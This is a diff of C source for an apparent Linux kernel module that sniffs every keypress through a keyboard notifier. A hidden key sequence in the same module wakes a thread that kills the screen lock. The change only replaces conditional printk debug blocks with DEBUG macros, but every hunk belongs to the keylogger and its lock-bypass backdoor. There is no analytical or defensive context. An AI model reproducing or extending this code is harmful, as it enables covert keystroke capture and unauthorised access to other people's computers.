@@ -31,18 +31,14 @@ int notify ( struct notifier_block *nblock, unsigned long code, void *_param )
 {
     struct keyboard_notifier_param *param = _param;
 
-    #if __DEBUG_KEY__
-    printk("KEYLOGGER %i %s\n", param->value, (param->down ? "down" : "up"));
-    #endif
+    DEBUG_KEY("KEYLOGGER %i %s\n", param->value, (param->down ? "down" : "up"));
 
     #if defined(_CONFIG_UNLOCK_)
     if ( sequence[sequence_i] == param->value )
     {
         if ( ++sequence_i == SEQUENCE_SIZE )
         {
-            #if __DEBUG__
-            printk("Key sequence detected, unlock the screen!\n");
-            #endif
+            DEBUG("Key sequence detected, unlock the screen!\n");
 
             to_unlock = 1;
             sequence_i = 0;
@@ -63,9 +59,7 @@ int unlocker ( void *data )
     {
         wait_event_interruptible(unlocker_event, (to_unlock == 1));
 
-        #if __DEBUG__
-        printk("Inside the unlocker thread, removing screen lock\n");
-        #endif
+        DEBUG("Inside the unlocker thread, removing screen lock\n");
 
         #if defined(_CONFIG_X86_)
         // Kill screenlock
@@ -90,9 +84,7 @@ static struct notifier_block nb = {
 
 void keylogger_init ( void )
 {
-    #if __DEBUG__
-    printk("Installing keyboard sniffer\n");
-    #endif
+    DEBUG("Installing keyboard sniffer\n");
 
     register_keyboard_notifier(&nb);
     #if defined(_CONFIG_UNLOCK_)
@@ -102,9 +94,7 @@ void keylogger_init ( void )
 
 void keylogger_exit ( void )
 {
-    #if __DEBUG__
-    printk("Uninstalling keyboard sniffer\n");
-    #endif
+    DEBUG("Uninstalling keyboard sniffer\n");
 
     #if defined(_CONFIG_UNLOCK_)
     kthread_stop(ts);
